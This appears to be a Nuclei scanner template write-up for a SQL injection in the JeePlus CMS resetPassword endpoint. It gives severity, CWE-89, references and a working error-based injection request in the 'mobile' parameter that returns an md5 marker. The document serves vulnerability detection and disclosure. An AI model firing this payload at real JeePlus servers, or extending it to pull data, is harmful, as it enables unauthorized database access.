# Nuclei Template: JeePlus CMS - SQL Injection
**Template ID:** jeeplus-cms-resetpassword-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`jeeplus-cms-resetpassword-sqli.yaml`)

## Vulnerability Information & PoC

## Description
A SQL injection vulnerability exists in the JeePlus low-code development platform, allowing attackers to manipulate database queries.This can lead to unauthorized data access, modification, or potential compromise of the application.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/a/sys/user/resetPassword?mobile=13588888888%27and%20(updatexml(1,concat(0x7e,(select%20md5({{num}})),0x7e),1))%23
```

## References
- https://github.com/wy876/wiki/blob/main/JeePlus%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%BC%80%E5%8F%91%E5%B9%B3%E5%8F%B0/JeePlus%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%BC%80%E5%8F%91%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
- http://www.cstam.oyg.cn/detail/429410
